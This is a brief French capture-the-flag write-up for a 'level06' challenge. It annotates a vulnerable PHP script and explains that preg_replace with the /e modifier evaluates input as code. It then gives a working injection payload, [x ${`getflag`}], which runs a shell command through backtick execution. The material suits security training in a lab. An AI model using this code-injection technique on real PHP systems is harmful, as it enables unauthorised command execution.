On voit un fichier php level06.php et son executable on supose:
#!/usr/bin/php
<?php
function y($m) fonction qui prend m une string en parametre
{ 
    $m = preg_replace("/\./", " x ", $m); remplace les . par des x dans m
    $m = preg_replace("/@/", " y", $m); remplace les @ par des y dans m
    return $m; return m
}

function x($y, $z) fonction qui prend 2 paremetre $y: un nom de fichier et $z: inutilliser
{ 
    $a = file_get_contents($y); //lit le contenu du fichier y
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); remplace le texte qui ressemble a [x <some text>] par le resultat de la fonction y(<some text>)
    $a = preg_replace("/\[/", "(", $a); remplace tout les caractaire [ par (
    $a = preg_replace("/\]/", ")", $a); remplace tout les caractaire ] par )
    return $a; return le text
}
$r = x($argv[1], $argv[2]); print $r; appelle la fonction x et affiche le resultat.
?>

On voit que le preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); utilise le caractaire e dans son regex ce qui signifie que
la string seras interpreter comme une commande. Il faut donc trouver la syntax pour executer getflag:
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

On trouver que pour que php execute une commande dans une string il faut lui mettre les operateur d'execution "`"
on trouve donc la syntax suivante:
[x ${`getflag`}]
=> ./level06 [x ${`getflag`}] => getflag :)